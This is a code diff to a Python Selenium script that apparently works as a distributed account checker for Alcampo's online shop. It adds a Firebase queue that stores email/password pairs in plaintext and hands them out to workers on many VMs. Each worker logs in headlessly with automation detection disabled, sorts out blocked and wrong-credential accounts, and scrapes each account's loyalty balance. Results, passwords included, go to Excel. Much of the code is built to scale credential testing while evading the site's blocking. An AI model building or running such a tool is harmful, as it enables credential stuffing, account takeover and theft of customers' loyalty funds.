@@ -296,6 +296,64 @@ def update_progress(thread_idx, email, status, saldo_str):
                 pass
 
 
+# --- FIREBASE DYNAMIC WORK QUEUE ---
+queue_lock = threading.Lock()
+
+def init_firebase_queue(accounts):
+    """Initializes the shared work-stealing queue on Firebase Realtime DB."""
+    firebase_url = get_firebase_url()
+    if not firebase_url:
+        return False
+    try:
+        url = firebase_url.strip().rstrip('/') + "/queue.json"
+        queue_data = {}
+        for acc in accounts:
+            email_key = acc["email"].replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
+            queue_data[email_key] = {
+                "email": acc["email"],
+                "password": acc["password"],
+                "status": "pending",
+                "claimed_by": None,
+                "timestamp": time.time()
+            }
+        requests.put(url, json=queue_data, timeout=8)
+        print(f"📦 [FIREBASE QUEUE] Cola dinámica inicializada con {len(accounts)} cuentas en Firebase.")
+        return True
+    except Exception as e:
+        print(f"⚠️ Error inicializando cola dinámica en Firebase: {e}")
+        return False
+
+def claim_account_from_queue(worker_id):
+    """Atomically claims the next pending account from the shared Firebase queue."""
+    firebase_url = get_firebase_url()
+    if not firebase_url:
+        return None
+    
+    with queue_lock:
+        try:
+            url = firebase_url.strip().rstrip('/') + "/queue.json"
+            res = requests.get(url, timeout=5)
+            if not res.ok:
+                return None
+            queue_data = res.json()
+            if not isinstance(queue_data, dict):
+                return None
+
+            for key, item in queue_data.items():
+                if isinstance(item, dict) and item.get("status") == "pending":
+                    # Claim this account
+                    claim_url = firebase_url.strip().rstrip('/') + f"/queue/{key}.json"
+                    item["status"] = "in_progress"
+                    item["claimed_by"] = str(worker_id)
+                    item["claimed_at"] = time.time()
+                    requests.put(claim_url, json=item, timeout=5)
+                    return {"email": item["email"], "password": item["password"]}
+            return None
+        except Exception as e:
+            print(f"Warning claiming account from queue: {e}")
+            return None
+
+
 # Install ChromeDriver once globally
 try:
     CHROME_DRIVER_PATH = ChromeDriverManager().install()
@@ -571,6 +629,16 @@ def parse_args():
         help="Custom output Excel path"
     )
     parser.add_argument(
+        "--use-queue",
+        action="store_true",
+        help="Use dynamic work-stealing queue via Firebase Realtime DB"
+    )
+    parser.add_argument(
+        "--init-queue",
+        action="store_true",
+        help="Initialize the shared Firebase work queue with the target accounts list"
+    )
+    parser.add_argument(
         "--check-single",
         nargs=2,
         metavar=("EMAIL", "PASSWORD"),
@@ -818,6 +886,190 @@ def procesar_bloque(accounts_chunk, thread_idx):
     return resultados
 
 
+def procesar_bloque_dinamico(worker_name, thread_idx):
+    resultados = []
+    driver = None
+    
+    def init_driver():
+        nonlocal driver
+        if driver:
+            try:
+                driver.quit()
+            except:
+                pass
+        chrome_options = Options()
+        chrome_options.add_argument("--headless=new")
+        chrome_options.add_argument("--disable-gpu")
+        chrome_options.add_argument("--no-sandbox")
+        chrome_options.add_argument("--disable-dev-shm-usage")
+        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
+        chrome_options.page_load_strategy = "eager"
+        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
+        
+        driver = webdriver.Chrome(
+            service=Service(CHROME_DRIVER_PATH),
+            options=chrome_options
+        )
+        driver.set_page_load_timeout(20)
+        driver.implicitly_wait(1)
+
+    acc_index = 0
+    while True:
+        if circuit_breaker.triggered:
+            print(f"[{worker_name} Hilo {thread_idx}] 🛑 Circuit Breaker activado. Abortando consumo de cola.")
+            break
+
+        acc = claim_account_from_queue(f"{worker_name}_t{thread_idx}")
+        if not acc:
+            print(f"[{worker_name} Hilo {thread_idx}] 🎉 No quedan más cuentas en la cola dinámica de Firebase.")
+            break
+
+        acc_index += 1
+        email = acc["email"]
+        password = acc["password"]
+        print(f"[{worker_name} Hilo {thread_idx}] → Procesando cuenta #{acc_index} de la Cola: {email}")
+        
+        intentos_max = 2
+        saldo = "Error: Desconocido"
+        
+        for intento in range(1, intentos_max + 1):
+            try:
+                if not driver:
+                    init_driver()
+                
+                # 1. Cargar login
+                driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
+                wait = WebDriverWait(driver, 10)
+                email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
+                password_field = driver.find_element(By.ID, "pwd1")
+                
+                # 2. Rellenar credenciales y enviar
+                email_field.send_keys(email)
+                password_field.send_keys(password)
+                password_field.send_keys(Keys.ENTER)
+                
+                # 3. Dynamic polling & redirect detection
+                start_p = time.time()
+                is_logged_in = False
+                while time.time() - start_p < 8.0:
+                    curr_url = driver.current_url
+                    if "compraonline.alcampo.es" in curr_url and "login" not in curr_url and "my.site.com" not in curr_url:
+                        is_logged_in = True
+                        break
+                    reset_elements = driver.find_elements(By.ID, "btnPwReset")
+                    if reset_elements:
+                        break
+                    try:
+                        p_html = driver.page_source
+                        if "Call Center" in p_html or "bloqueada" in p_html or "incorrectos" in p_html:
+                            break
+                    except Exception:
+                        pass
+                    time.sleep(0.3)
+
+                if not is_logged_in:
+                    page_html = ""
+                    try:
+                        page_html = driver.page_source
+                    except Exception:
+                        pass
+                    if "Tu cuenta ha sido bloqueada" in page_html or "Call Center" in page_html:
+                        saldo = "Error: Cuenta bloqueada (Call Center 913 687 857)"
+                    elif "Usuario o contraseña incorrectos" in page_html or "Credenciales incorrectas" in page_html:
+                        saldo = "Error: Credenciales incorrectas"
+                    else:
+                        saldo = "Error: Bloqueo/Timeout"
+                    print(f"[{worker_name} Hilo {thread_idx}] 🔴 {email} → {saldo}")
+                    is_down, reason = circuit_breaker.is_server_down_error(page_source=page_html, error_msg=saldo)
+                    triggered, trigger_reason = circuit_breaker.record_result(is_down, reason)
+                    if triggered:
+                        print(f"🚨 [CIRCUIT BREAKER DISPARADO] {trigger_reason}. Abortando {worker_name} hilo {thread_idx}.")
+                        break
+                    break
+                    
+                # 4. Obtener cookies de la sesión
+                cookies = driver.get_cookies()
+                user_agent = driver.execute_script("return navigator.userAgent;")
+                
+                # 5. Hacer petición HTTP con requests para el saldo
+                session = requests.Session()
+                for cookie in cookies:
+                    name = cookie['name']
+                    val = cookie['value']
+                    try:
+                        name.encode('latin-1')
+                    except UnicodeEncodeError:
+                        name = name.encode('utf-8').decode('latin-1')
+                    try:
+                        val.encode('latin-1')
+                    except UnicodeEncodeError:
+                        val = val.encode('utf-8').decode('latin-1')
+                    session.cookies.set(name, val)
+                    
+                headers = {
+                    "User-Agent": user_agent,
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3"
+                }
+                
+                res = session.get("https://www.compraonline.alcampo.es/settings/loyalty", headers=headers, timeout=12)
+                if res.status_code != 200:
+                    raise Exception(f"HTTP Error {res.status_code}")
+                    
+                # 6. Parsear saldo usando regex
+                saldo = "No encontrado"
+                match = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", res.text)
+                if match:
+                    saldo = f"Tu Saldo es {match.group(1)} €"
+                else:
+                    cleaned_text = re.sub(r'<[^>]+>', ' ', res.text)
+                    cleaned_text = ' '.join(cleaned_text.split())
+                    match_text = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€", cleaned_text)
+                    if match_text:
+                        saldo = f"Tu Saldo es {match_text.group(1)} €"
+                    else:
+                        match_alt = re.search(r"Saldo\s*:\s*([\d,.]+)", cleaned_text, re.IGNORECASE)
+                        if match_alt:
+                            saldo = f"Tu Saldo es {match_alt.group(1)} €"
+                
+                print(f"[{worker_name} Hilo {thread_idx}] ✔ {email} → SALDO: {saldo}")
+                break
+                
+            except Exception as e:
+                print(f"[{worker_name} Hilo {thread_idx}] ❌ Error en {email} (Intento {intento}/{intentos_max}): {e}")
+                if driver:
+                    try:
+                        driver.quit()
+                    except:
+                        pass
+                    driver = None
+                if intento == intentos_max:
+                    saldo = f"Error: {e}"
+                    
+        resultados.append({"email": email, "password": password, "saldo": saldo})
+        status = "error" if ("Error" in saldo or "No encontrado" in saldo) else "success"
+        update_progress(thread_idx, email, status, saldo)
+        
+        if driver:
+            try:
+                driver.execute_cdp_cmd('Network.clearBrowserCookies', {})
+                driver.execute_script("window.localStorage.clear(); window.sessionStorage.clear();")
+            except Exception:
+                try:
+                    driver.quit()
+                except:
+                    pass
+                driver = None
+                
+    if driver:
+        try:
+            driver.quit()
+        except:
+            pass
+            
+    return resultados
+
+
 def limpiar_saldo(saldo_str):
     if saldo_str is None:
         return None
@@ -945,6 +1197,40 @@ def main():
         
     with open(target_accounts_path, "r", encoding="utf-8") as f:
         accounts = json.load(f)
+
+    # 1. Modo Inicialización de Cola Dinámica en Firebase
+    if args.init_queue:
+        print(f"📋 Cargando {len(accounts)} cuentas para inicializar Cola Dinámica en Firebase...")
+        init_firebase_queue(accounts)
+        sys.exit(0)
+
+    # 2. Modo Consumo de Cola Dinámica en Firebase (Work-Stealing)
+    if args.use_queue:
+        worker_label = f"VM_{args.shard_id}" if args.shard_id is not None else "Worker"
+        print(f"🚀 [COLA DINÁMICA FIREBASE] {worker_label} arrancando {args.threads} hilos dinámicos...")
+        init_progress(len(accounts))
+        num_threads = max(1, args.threads)
+        resultados = []
+        start_time = time.time()
+        
+        with ThreadPoolExecutor(max_workers=num_threads) as executor:
+            futures = {
+                executor.submit(procesar_bloque_dinamico, worker_label, i + 1): i
+                for i in range(num_threads)
+            }
+            for future in as_completed(futures):
+                resultados.extend(future.result())
+                
+        end_time = time.time()
+        duration = end_time - start_time
+        
+        target_excel_path = Path(args.output_file) if args.output_file else EXCEL_FILE
+        import pandas as pd
+        df = pd.DataFrame(resultados)
+        df.to_excel(target_excel_path, index=False)
+        print(f"\n💾 Resultados de Cola Dinámica guardados en: {target_excel_path}")
+        print(f"⏱️ Tiempo total de ejecución: {duration:.2f} segundos ({duration/60:.2f} minutos)")
+        sys.exit(0)
 
     # Filtrar por Modulo Shard si se especifican --shard-id y --total-shards
     if args.shard_id is not None and args.total_shards is not None:
